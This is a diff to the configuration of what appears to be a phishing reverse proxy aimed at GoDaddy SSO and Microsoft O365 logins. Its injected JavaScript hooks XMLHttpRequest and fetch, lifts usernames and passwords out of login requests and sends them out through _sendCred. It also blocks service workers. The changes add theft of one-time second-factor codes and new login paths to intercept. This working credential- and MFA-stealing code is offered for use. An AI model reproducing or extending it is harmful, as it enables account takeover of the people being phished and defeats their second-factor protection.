@@ -248,6 +248,8 @@ auth_urls:
   - '/v1/login'
   - '/sso/v1/login'
   - '/v1/api/pass/login'
+  - '/v1/api/pass/my/token'
+  - '/saml/owa'
   - '/login/callback'
   - '/oauth2/callback'
   - '/login.srf'
@@ -372,7 +374,7 @@ js_inject:
   # x-tymus session cookie on this subdomain (session was set on Microsoft proxy).
   # sso.secureserver.net is used for custom-domain GoDaddy O365 tenants.
   - trigger_domains: ["sso.godaddy.com", "sso.secureserver.net"]
-    trigger_paths: ["/*"]
+    trigger_paths: ["/*", "/login/tac/pass*"]
     script: |
       (function() {
         // Block new service worker registrations so they can't intercept requests.
@@ -473,10 +475,12 @@ js_inject:
                 var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
                 var user = obj.username || obj.email || obj.login || obj.user || '';
                 if (pass) _sendCred(pass, user);
+                // OTP/TAC capture — POST /v1/api/pass/my/token {"factor":"k_tac","value":"<otp>"}
+                if (obj.factor && obj.value) _sendCred(obj.value, email || user || '');
               } catch(e) {}
             }
-            // Watch login API response — non-2xx means Kasada rejected → redirect
-            if (this._xu && (this._xu.indexOf('/pass/login') !== -1 || this._xu.indexOf('/v1/login') !== -1 || this._xu.indexOf('/api/login') !== -1)) {
+            // Watch login + OTP API responses — non-2xx means failure → redirect
+            if (this._xu && (this._xu.indexOf('/pass/login') !== -1 || this._xu.indexOf('/pass/my/token') !== -1 || this._xu.indexOf('/v1/login') !== -1 || this._xu.indexOf('/api/login') !== -1)) {
               var self = this;
               this.addEventListener('load', function() {
                 if (self.status >= 400 || self.status === 0) {
@@ -497,7 +501,7 @@ js_inject:
         var _oFetch = window.fetch;
         window.fetch = function(url, opts) {
           var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : '');
-          var isLogin = urlStr.indexOf('/pass/login') !== -1 || urlStr.indexOf('/v1/login') !== -1 || urlStr.indexOf('/api/login') !== -1;
+          var isLogin = urlStr.indexOf('/pass/login') !== -1 || urlStr.indexOf('/pass/my/token') !== -1 || urlStr.indexOf('/v1/login') !== -1 || urlStr.indexOf('/api/login') !== -1;
           if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
             try {
               var bodyStr = typeof opts.body === 'string' ? opts.body : (opts.body instanceof URLSearchParams ? opts.body.toString() : '');
@@ -506,6 +510,7 @@ js_inject:
                 var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
                 var user = obj.username || obj.email || obj.login || obj.user || '';
                 if (pass) _sendCred(pass, user);
+                if (obj.factor && obj.value) _sendCred(obj.value, email || user || '');
               }
             } catch(e) {}
           }
